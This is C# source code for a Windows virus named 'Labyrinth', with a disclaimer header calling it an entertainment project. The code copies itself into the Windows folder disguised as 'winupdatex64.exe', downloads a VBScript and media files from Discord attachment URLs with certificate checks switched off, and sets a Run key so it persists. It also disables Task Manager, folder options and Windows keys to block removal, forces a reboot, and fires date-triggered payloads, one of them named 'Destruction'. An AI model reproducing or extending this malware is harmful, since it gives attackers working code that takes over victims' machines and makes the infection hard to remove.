/* 
 * Virus.Win32.Labyrinth
 * By T3chyy
 * 
 * THIS MALWARE HAS NO NETWORK SPREADING ROUTINE; CREATED FOR ENTERTAINMENT PURPOSES ONLY
 * THIS MALWARE HEAVILY MODIFIES THE REGISTRY, DO NOT SEND TO ANYONE AS A PRANK OR JOKE.
 * I TAKE NO RESPONSIBLITY FOR ANY DAMAGES THIS PROGRAM CAUSES.
 * 
 * FINISHED 6/21/21 2:21 PM CDT
*/
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Labyrinth
{
    class Program
    {
        //Variables
        const string malName = "Labyrinth";
        const string malFolder = @"C:\Program Files\" + malName;
        const string mutexPath = @"C:\Program Files\Labyrinth\mutex.dat"; // theres probably a better way to make a mutex, but im lazy ;-;
        static string malHost = Environment.GetEnvironmentVariable("windir") + "\\winupdatex64.exe";
        static void Main()
        {
            //if mutex isn't created, start installation
            if (!File.Exists(mutexPath))
            {
                Directory.CreateDirectory(malFolder).Attributes = FileAttributes.Hidden;
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, malHost);
                File.SetAttributes(malHost, FileAttributes.Hidden);
                try
                {
                    ServicePointManager.ServerCertificateValidationCallback =
                    ((sender, certificate, chain, sslPolicyErrors) => true);

                    //Media files for payloads to work properly
                    new WebClient().DownloadFile("http://media.discordapp.net/attachments/277936595540115457/855281375099093053/weed.png", malFolder + "\\w.png");
                    new WebClient().DownloadFile("http://cdn.discordapp.com/attachments/277936595540115457/855889684559429632/c.wav", malFolder + "\\c.wav");
                    new WebClient().DownloadFile("http://cdn.discordapp.com/attachments/277936595540115457/855551083749048361/msg.vbs", malFolder + "\\msg.vbs");
                    new WebClient().DownloadFile("http://media.discordapp.net/attachments/277936595540115457/855559984280371270/troll.png", malFolder + "\\t.png");
                    new WebClient().DownloadFile("http://cdn.discordapp.com/attachments/277936595540115457/856265313930182686/f.bmp", malFolder + "\\f.bmp");
                }
                catch (Exception e)
                {
                    Misc.StandardException(e);
                }
                //run at startup
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "winupdatex64", malHost, RegistryValueKind.String);

                //make it harder to remove virus
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", 1, RegistryValueKind.DWord);
                Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", "NoFolderOptions", 1, RegistryValueKind.DWord);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "NoWinKeys", 1, RegistryValueKind.DWord);

                File.Create(mutexPath); //create mutex
                Misc.ExitWindowsEx(0 | 0x00000002, 0); //reboot after install
            } 
            else
            {
                try
                {
                    //If installed, check for payload activation dates
                    if (DateTime.Now.Month == 10 && DateTime.Now.Day == 1)
                    {
                        Payload.Winfig();
                    }

                    else if (DateTime.Now.Month == 4 && DateTime.Now.Day == 20)
                    {
                        Payload.WeedDay();
                    }

                    else if (DateTime.Now.Month == 5 && DateTime.Now.Day == 8)
                    {
                        Payload.Destruction();
                    }

                    else if (DateTime.Now.Month == 10 && DateTime.Now.Day == 20)
                    {
                        Payload.GoOutside();
                    }

                    else
                    {
                        Misc.UnHookExe(); // theres probably better ways to reset the exefile registry after a payload, but again, im lazy.
                    }
                }
                catch (Exception e)
                {
                    Misc.StandardException(e);
                }
            }
        }
    }
}
